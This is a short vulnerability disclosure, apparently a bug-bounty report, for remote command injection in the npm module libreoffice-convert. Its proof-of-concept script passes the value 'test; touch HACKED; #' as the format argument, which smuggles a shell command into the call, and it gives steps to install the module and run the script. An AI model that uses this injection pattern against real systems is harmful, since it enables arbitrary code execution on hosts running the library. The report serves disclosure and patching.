# Description

The `libreoffice-convert` module is vulnerable against `RCE` since a command is crafted using `user inputs` not validated and then executed, leading to `arbitrary command injection`

# POC

1. Create the following PoC file:

```js
// poc.js
const libre = require('libreoffice-convert');
libre.convert('', 'test; touch HACKED; #', undefined, (err, done) => {
    if (err) {
      console.log(`Error converting file: ${err}`);
    }
});

```
2. Check there aren't files called `HACKED` 
3. Execute the following commands in another terminal:

```bash
sudo apt install libreoffice # You need to install libreoffice
# Or instead, simply create a file placed in the libreoffice dir with the same name, in order to avoid to install the whole software: * echo "test" >  /usr/bin/libreoffice*
npm i libreoffice-convert # Install affected module
node poc.js #  Run the PoC
```
4. Recheck the files: now `HACKED` has been created 
